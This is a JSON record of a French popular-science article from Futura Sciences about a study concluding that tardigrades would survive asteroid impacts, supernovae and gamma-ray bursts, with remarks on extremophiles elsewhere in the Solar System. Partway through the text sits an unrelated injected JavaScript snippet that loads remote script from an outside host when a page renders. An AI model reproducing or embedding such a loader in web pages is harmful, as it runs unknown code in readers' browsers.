{"title": "Les tardigrades seront les derniers survivants sur Terre", "newspaper": "Futura Sciences", "author": "Xavier Demeersman", "date_publi": "17/07/2017", "content": "Des chercheurs ont voulu savoir ce qu'il se passerait dans le cas où de grands cataclysmes d'origine cosmique survenaient sur Terre. Résultat : là où l'Homme ne survivrait pas, les tardigrades, connus pour leur incroyable résistance lorsqu'ils sont soumis à des conditions extrêmes, resteraient invaincus. Ce qu'il faut retenir Beaucoup d’études se sont intéressées aux effets sur l’Homme d’évènements cosmiques catastrophiques comme la chute d’un astéroïde, l’explosion d’une supernova ou des sursauts gamma, mais très peu ont examiné la résilience de la vie elle-même. Des chercheurs ont évalué la résistance des tardigrades, créatures quasi indestructibles, face à de tels cataclysmes. Aucun ne risque de se produire ou ne serait assez proche pour les détruire. La vie semble plus résistante qu’on ne le pensait.  « Il est difficile d'éliminer toutes les formes de vie d'une planète habitable ». Les  tardigrades  survivront bien plus longtemps que l'essentiel des formes de vie sur  Terre . C'est ce que montre une étude réalisée par trois chercheurs de l'université d'Oxford et du  Harvard-Smithsonian Center for Astrophysics . Celle-ci vient de paraître dans  Scientific Reports . En effet, pour les rayer de notre monde, il faudrait un évènement capable de faire  bouillir les océans  — ce qui devrait se produire dans environ un milliard d'années, voire plus, sous le joug de notre  soleil  en déclin. Autrement, ces petites créatures à huit pattes d'un demi-millimètre de long et surnommées oursons d'eau n'ont pas de  soucis  à se faire. Pour les trois auteurs, David Sloan, Rafael Alves Batista et Abraham Loeb,  Milnesium tardigradum  n'a pas à trembler devant d'éventuels cataclysmes venus du ciel, que ce soit des  astéroïdes , l'explosion d'une  supernova  ou des  sursauts  gamma. D'après leurs recherches, aucun de ces phénomènes ne représente une menace suffisante pour annihiler cette  espèce  quasi indestructible et, de fait, stériliser la Terre. Le saviez-vous ? Les tardigrades (dont le nom signifie « marcheurs lents ») sont les formes de vie les plus résistantes sur Terre. Par exemple, récemment des chercheurs ont pu  réveiller deux individus et un œuf après 30 ans passé à -30 °C  en état de « vie arrêtée », ou cryptobiose. Ils sont capables d’endurer des températures supérieures à 150 °C, des pressions élevées jusqu’à 300 fois celle de l'atmosphère terrestre, de résister à des doses mortelles de rayons ultraviolets, ou encore de survivre au vide spatial. Cette incroyable petite créature de 0,5 mm de long est capable de vivre jusqu’à 60 ans. Les chercheurs n’ont pas fini de découvrir ses prouesses. Ces trois sources  astrophysiques  sont les seules considérées comme capables d'éradiquer totalement la vie sur une planète de type terrestre. Or, d'après leurs modèles et les données dont les astronomes disposent, aucune d'entre elles ne menace directement notre  biosphère .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Astéroïdes, supernovae et sursauts gamma Pour le cas des  astéroïdes , même si nous en connaissons plusieurs milliers qui sont potentiellement dangereux et croisent régulièrement l' orbite  de notre planète, aucun ne possède une  masse  suffisante pour faire bouillir les océans en cas d'impact. En réalité, seuls douze objets dans notre  Système solaire  ont été identifiés comme capables d'un tel cataclysme : des astéroïdes comme  Vesta , le plus gros de tous, dans la ceinture principale, ou des  planètes naines  comme  Pluton . Les  tardigrades , et nous avec, n'ont pas à s'inquiéter : pas un seul de ces corps célestes n'empruntera un jour une trajectoire de collision avec la Terre. (Quoique, si une  étoile  venait à traverser notre Système solaire, comme par exemple  Gliese 710  dans un million d'années, celle-ci pourrait semer la zizanie et précipiter plusieurs astéroïdes et  comètes  dans le système interne ; toutefois, ce ne serait vraisemblablement pas un corps de l'acabit de Pluton ou  Cérès ...) En ce qui concerne d'éventuelles menaces de  supernovae , d'autres évènements astronomiques puissants qui seraient en mesure de stériliser la Terre, que l'on se rassure aussi : il faudrait que l'étoile qui explose soit à moins de 0,14  année-lumière , autrement dit à l'intérieur de notre Système solaire, à quelque 1.300 milliards de km. Rien de tel ne risque d'arriver. Notre voisine,  Proxima du Centaure , est à plus de 4 années-lumière, et il n'y a aucun risque que cette petite  naine rouge  termine sa vie prochainement, encore moins aussi violemment. Il n'y a donc pas une supernova à l'horizon qui menace de nous exterminer. Le risque que cela se produise d'ici la mort du soleil, dans 5 milliards d'années, est négligeable. Voir aussi : La Terre frappée par les pluies radioactives d'une supernova Enfin, la probabilité que des  sursauts gamma  nous anéantissent est, elle aussi, très faible. Ces phénomènes très brefs sont plus rares encore que les supernovae. Il faudrait qu'il y en ait un qui survienne à environ 40 années-lumière pour détruire toute forme de vie sur Terre jusqu'aux derniers, les tardigrades... Et, là aussi, rien de tel ne se profile à de si petites distances. « Bien que les supernovae proches ou les gros impacts d'astéroïdes soient catastrophiques pour les êtres humains, les tardigrades pourraient ne pas être affectés. »  © Sebastian Kaulitzki, Fotolia                               Difficile d'éliminer toutes les formes de vie d'une planète habitable À l'origine de cette étude, les trois chercheurs déploraient que, dans la littérature scientifique, nombre de travaux s'intéressaient exclusivement aux effets de ces cataclysmes cosmiques sur l'espèce humaine, voire sur l'ensemble des espèces terrestres, et si peu sur la  résilience  de la vie elle-même. “ Il y a beaucoup d'espèces plus résistantes [que l'Homme] sur Terre. La vie est susceptible de se poursuivre bien après notre disparition. Dans cette perspective, cette nouvelle étude montre, certes, que l'Homme est fragile :  « De petits changements dans notre environnement peuvent avoir des conséquences dramatiques pour nous » , souligne le coauteur Rafael Alves Batista. Mais qu'en réalité,  « il y a beaucoup d'espèces plus résistantes [que l'Homme] sur Terre. La vie est susceptible de se poursuivre bien après notre disparition » .  C'est une mauvaise nouvelle pour nous mais, dans le fond, c'est une bonne nouvelle pour la recherche de la vie ailleurs. L'anéantir complètement semble donc plus difficile qu'on ne l'imagine !  « Les tardigrades sont presque indestructibles sur Terre. Il est possible qu'il y ait d'autres exemples d'espèces résilientes ailleurs dans l' univers , s'enthousiasme le chercheur.  Dans ce contexte, il existe un cas réel pour rechercher la vie sur Mars et dans d'autres domaines du Système solaire en général. Si les tardigrades sont les espèces les plus résistantes sur Terre, qui sait ce qu'il y a d'autre ailleurs. » « À notre grande surprise, nous avons constaté que, bien que les supernovae proches ou les gros impacts d'astéroïdes soient catastrophiques pour les êtres humains, les tardigrades pourraient ne pas être affectés. Par conséquent, il semble que la vie, une fois qu'elle se déroule, soit difficile à effacer entièrement , conclut David Sloan, coauteur et postdoc au département de  physique  de l'université d'Oxford.  Un nombre énorme d'espèces, ou même des genres entiers, peuvent disparaître, mais la vie dans son ensemble continue.  En fait,  il est difficile d'éliminer toutes les formes de vie d'une planète habitable » .  Les trois chercheurs ont bon espoir que des formes de vie aussi résistantes que ces incroyables  oursons d’eau aux super-pouvoirs  sommeillent dans le sous-sol de Mars, attendant qu'un jour des conditions soient de nouveau réunies pour qu'ils puissent s'alimenter.  « Les organismes ayant des tolérances aux rayonnements et à la température  semblables à celles d es tardigrades pourraient survivre à long terme sous la surface dans ces conditions,  relève le professeur Abraham Loeb, coauteur. En outre,  les océans souterrains que l'on suppose exister sur Europe et  Encelade  [des  lunes  en orbite respectivement autour de  Jupiter  et de  Saturne ,  NDLR ] pourraient avoir des conditions similaires à celles des océans profonds sur Terre où l'on trouve des tardigrades, avec des évents volcaniques fournissant de la  chaleur  dans un environnement dépourvu de lumière , explique-t-il.  La découverte d'extrémophiles dans de tels endroits serait un grand pas en avant sur la gamme des conditions de vie existant sur les planètes autour d'autres étoiles ». Des tardigrades filmés en plein accouplement                       Les tardigrades, ou oursons d’eau, sont de prodigieuses créatures. Étudiées depuis 250 ans, celles-ci n’avaient pourtant jamais été vues en train de s’accoupler. C’est désormais chose faite. Des chercheurs les ont en effet mises en condition et ont pu tout filmer. Attention, dans cette vidéo, nous ne vous montrons qu’un extrait, car leurs ébats durent en réalité environ une heure.                                       ", "theme": "planete"}